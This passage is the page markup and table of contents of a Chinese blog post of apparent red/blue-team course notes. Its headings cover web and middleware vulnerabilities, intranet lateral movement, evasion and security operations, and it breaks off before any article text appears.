<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205843495.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205920052.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210224569.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210811336.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211016871.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211151137.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211237197.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212701098.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212804827.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212853106.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213024873.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213055773.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213124083.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213324688.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213359405.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214039119.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214112799.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214449050.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214703372.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214732871.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214826540.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214915350.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215216130.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215508110.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220113146.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220148183.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220433905.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221353625.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716221823970.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211458133.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211603924.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211640434.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211718311.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720211738215.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212244679.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212300633.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212416280.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212429524.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212443481.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212500317.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212513850.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212550171.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212607604.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212624861.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212637310.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212652093.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212704967.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212723115.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212740402.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212759766.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212812736.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212829023.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212842376.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212856316.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212910137.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212922873.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720212936159.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213045148.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213103871.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213117733.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213150966.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213203225.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213219885.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213233146.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213247198.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213259188.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213310069.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213324469.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213338629.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213354017.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213405856.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213417386.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213432717.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213445651.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213456544.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213508974.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213520210.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213532602.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213550344.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213618711.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213630219.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213646085.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213656781.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213708434.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213718442.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213758077.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213810096.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213847667.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213857324.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213906685.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213917457.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213939512.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720213954218.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214207666.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214147195.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214120929.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214057031.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214259704.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214317607.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214331949.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214346660.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225125458.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225159840.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225300240.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225339252.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225939164.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230058011.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230118317.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230239898.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232126336.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232149625.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232223831.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232235811.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232250740.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232310109.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232325275.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232341493.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232412514.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232425547.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232442109.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232452273.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232530087.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232541764.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232551597.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232632292.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232644526.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232657593.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232707665.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232717725.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232838714.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233026904.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233043742.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233244650.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233310772.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233328583.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233347710.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211626893.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211819548.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725211902345.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212513068.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212551781.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725212836369.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213005759.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725213857913.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214656225.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214727303.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214755414.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725214840659.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215300340.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215326416.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215424509.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725215603509.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220725220020332.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211012780.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211704131.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211732246.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212016136.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212107855.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212157804.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212226440.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212408593.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212650998.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212806046.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212836589.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212922659.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212938238.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214148349.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214239988.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214257421.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214338418.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214352911.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214606430.png">
<meta property="og:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214906900.png">
<meta property="article:published_time" content="2022-07-01T06:04:25.000Z">
<meta property="article:modified_time" content="2022-08-02T14:07:54.416Z">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="HW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706160755467.png">


<link rel="canonical" href="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/","path":"2022/07/01/HW课程/","title":"HW课程"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HW课程 | Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Echo</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">逻辑漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">逻辑漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="nav-number">1.2.</span> <span class="nav-text">验证机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">会话管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="nav-number">1.4.</span> <span class="nav-text">权限控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="nav-number">1.5.</span> <span class="nav-text">业务逻辑</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">中间件漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.</span> <span class="nav-text">IIS漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache"><span class="nav-number">2.2.</span> <span class="nav-text">Apache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomact"><span class="nav-number">2.3.</span> <span class="nav-text">Tomact</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx"><span class="nav-number">2.4.</span> <span class="nav-text">Nginx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weblogic"><span class="nav-number">2.5.</span> <span class="nav-text">weblogic</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">信息收集与外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%9C%E6%88%98%E6%96%B9%E6%A1%88%E8%A7%84%E5%88%92"><span class="nav-number">3.1.</span> <span class="nav-text">作战方案规划</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96-%E7%BD%91-%E4%BF%A1-%E6%81%AF-%E6%94%B6-%E9%9B%86"><span class="nav-number">3.2.</span> <span class="nav-text">外 网 信 息 收 集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB-%E9%80%9F-%E6%89%93-%E7%82%B9-%E7%AA%81-%E7%A0%B4"><span class="nav-number">3.3.</span> <span class="nav-text">快 速 打 点 突 破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-number">4.</span> <span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90-%E6%9D%83-%E7%9B%B8-%E5%85%B3"><span class="nav-number">4.1.</span> <span class="nav-text">提 权 相 关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83-%E9%99%90-%E7%BB%B4-%E6%8C%81"><span class="nav-number">4.2.</span> <span class="nav-text">权 限 维 持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85-%E7%BD%91-%E6%9C%AC-%E6%9C%BA-%E6%94%B6-%E9%9B%86"><span class="nav-number">4.3.</span> <span class="nav-text">内 网 本 机 收 集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85-%E7%BD%91-%E6%A8%AA-%E5%90%91-%E6%94%B6-%E9%9B%86"><span class="nav-number">4.4.</span> <span class="nav-text">内 网 横 向 收 集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85-%E7%BD%91-%E7%A9%BF-%E9%80%8F"><span class="nav-number">4.5.</span> <span class="nav-text">内 网 穿 透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C-2-%E6%B5%81%E9%87%8F%E9%9A%90%E5%8C%BF"><span class="nav-number">4.6.</span> <span class="nav-text">C 2 流量隐匿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA-%E5%90%91-%E4%B8%AD-%E7%9A%84-%E5%87%AD-%E8%AF%81-%E7%AA%83-%E5%8F%96"><span class="nav-number">4.7.</span> <span class="nav-text">横 向 中 的 凭 证 窃 取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA-%E5%90%91-%E4%B8%AD-%E7%9A%84-%E5%91%BD-%E4%BB%A4-%E6%89%A7-%E8%A1%8C"><span class="nav-number">4.8.</span> <span class="nav-text">横 向 中 的 命 令 执 行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%91-%E5%AE%89-%E5%85%A8-%E4%BB%8B-%E7%BB%8D"><span class="nav-number">4.9.</span> <span class="nav-text">云 安 全 介 绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97"><span class="nav-number">5.</span> <span class="nav-text">域渗透与免杀对抗</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.1.</span> <span class="nav-text">域信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%8B%E6%B3%95"><span class="nav-number">5.2.</span> <span class="nav-text">域横向手法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#waf%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">waf绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell%E5%85%8D%E6%9D%80"><span class="nav-number">5.4.</span> <span class="nav-text">webshell免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode%E5%85%8D%E6%9D%80"><span class="nav-number">5.5.</span> <span class="nav-text">shellcode免杀</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4"><span class="nav-number">6.</span> <span class="nav-text">安全运维</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4-%E7%BD%91-%E6%A6%82-%E8%BF%B0"><span class="nav-number">6.1.</span> <span class="nav-text">护 网 概 述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D-%E6%9C%9F-%E8%87%AA-%E6%9F%A5-%E5%B7%A5-%E4%BD%9C"><span class="nav-number">6.2.</span> <span class="nav-text">前 期 自 查 工 作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 